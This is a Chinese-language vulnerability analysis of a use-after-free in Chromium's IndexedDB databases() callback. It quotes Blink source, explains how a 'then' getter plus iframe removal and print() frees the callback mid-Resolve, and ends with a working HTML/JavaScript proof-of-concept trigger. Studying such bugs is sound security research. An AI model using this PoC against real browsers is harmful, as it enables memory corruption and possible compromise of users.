## 成因分析

```
  void SuccessNamesAndVersionsList(
      Vector<mojom::blink::IDBNameAndVersionPtr> names_and_versions) override {
    if (!promise_resolver_)
      return;

    HeapVector<Member<IDBDatabaseInfo>> name_and_version_list;
    name_and_version_list.ReserveInitialCapacity(name_and_version_list.size());
    for (const mojom::blink::IDBNameAndVersionPtr& name_version :
         names_and_versions) {
      const IDBNameAndVersion idb_name_and_version(name_version->name,
                                                   name_version->version);
      IDBDatabaseInfo* idb_info = IDBDatabaseInfo::Create();
      idb_info->setName(name_version->name);
      idb_info->setVersion(name_version->version);
      name_and_version_list.push_back(idb_info);
    }

    probe::AsyncTask async_task(
        ExecutionContext::From(promise_resolver_->GetScriptState()),
        &async_task_id_, "success");
    promise_resolver_->Resolve(name_and_version_list);
    promise_resolver_.Clear();
  }
```
关于Resolve，这里就放kp师傅的笔记了，学到很多：https://github.com/eternalsakura/sakura_browser_learn/blob/main/type%20confusion/unfinished%20-%20TypeConfusionInTriggerPromiseReactions.md#2-%E5%B0%9D%E8%AF%95%E8%A7%A6%E5%8F%91%E4%B8%A4%E6%AC%A1fulfill

如果设置了其then属性，那么当控制流执行至此处时，就会调用用户所设计的getter。也就是说，在Resolve执行到一半时，可以执行用户所定义的外部JS代码。

```
mojo::PendingAssociatedRemote<mojom::blink::IDBCallbacks>
WebIDBFactoryImpl::GetCallbacksProxy(
    std::unique_ptr<WebIDBCallbacks> callbacks_impl) {
  mojo::PendingAssociatedRemote<mojom::blink::IDBCallbacks> pending_callbacks;
  mojo::MakeSelfOwnedAssociatedReceiver(
      std::move(callbacks_impl),
      pending_callbacks.InitWithNewEndpointAndPassReceiver(), task_runner_);
  return pending_callbacks;
}
```
可以看到WebIDBCallbacks创建时使用的是MakeSelfOwnedReceiver，这使得它是一个StrongBinding，这意味着它掌控它自己，只有当interface关闭了或者出现通信错误了才会调用析构函数。攻击者可以通过删除与执行上下文关联的iframe元素(用于进行indexedDB调用)来强制浏览器进程中的接收方断开连接。在那之后，代码需要进入一个嵌套的事件循环，例如，通过' window.print() '，所以远程对象能够处理断开事件，而' SuccessNamesAndVersionsList '函数仍然在调用堆栈上。

之后Resolve执行完毕，在调用clear时，Impl已经被删除，导致uaf

poc：
```
<body>
<script>
if (window == top) {
  frame = document.body.appendChild(document.createElement('iframe'));
  frame.src = location.href.replace('localhost', '127.0.0.1');

  setTimeout(() => frame.remove(), 3000);
} else {
  frame = document.body.appendChild(document.createElement('iframe'));
  wnd = frame.contentWindow;

  wnd.indexedDB.databases();

  array_proto = wnd.Array.prototype;
  array_proto.__defineGetter__('then', function() {
    delete array_proto.then;

    frame.remove();

    print();
  });
}
</script>
</body>
```
